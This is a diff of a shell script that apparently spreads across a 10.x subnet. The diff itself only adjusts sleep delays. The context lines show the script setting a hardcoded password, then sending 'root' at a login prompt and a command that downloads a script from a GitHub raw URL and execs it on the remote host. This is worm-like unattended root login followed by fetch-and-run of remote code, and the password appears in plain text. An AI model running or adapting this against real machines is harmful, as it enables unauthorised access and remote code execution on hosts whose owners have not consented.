@@ -1,7 +1,7 @@
 #!/bin/sh
 
 # set non-blank password
-( sleep 2 ; echo "0MFi9ihnb6NmQ85M" ; sleep 1 ; echo "0MFi9ihnb6NmQ85M" ; sleep 2 ) | passwd
+( sleep 1 ; echo "0MFi9ihnb6NmQ85M" ; sleep 1 ; echo "0MFi9ihnb6NmQ85M" ; sleep 1 ) | passwd
 
 MYSUBNET=`route -n | sed -nE 's/^(10\.[0-9]+)\.[0-9]+\.[0-9]+ .+$/\1/p'`
 NMAPTIMING="-T polite"
@@ -9,13 +9,13 @@ NMAPTIMING="-T polite"
 talk() {
   sleep 1
   echo root
-  sleep 2
+  sleep 1
   echo -n 'J=`mktemp` ;'
   echo -n 'curl https://raw.githubusercontent.com/ironiridis/creepy-alarming-lamp/master/cal.sh > $J ;'
   echo -n 'chmod +x $J ;'
   echo 'exec $J'
 #  echo 'nohup $J > /dev/null 2>&1'
-  sleep 20
+  sleep 30
 }
 
 connectTo() {
